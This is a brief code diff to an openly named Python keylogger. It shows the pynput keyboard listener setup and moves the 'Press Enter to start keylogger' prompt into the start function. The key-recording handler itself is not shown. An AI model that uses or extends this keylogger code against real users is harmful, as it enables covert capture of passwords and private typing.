@@ -35,10 +35,7 @@ def on_press(key):
 
 #start the keylogger and listen for key presses
 def start_keylogger():
-
+    input("Press Enter to start keylogger...")
 # Use pynput listener to see the key presses
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-
-input("Press Enter to start keylogger...")
-start_keylogger()
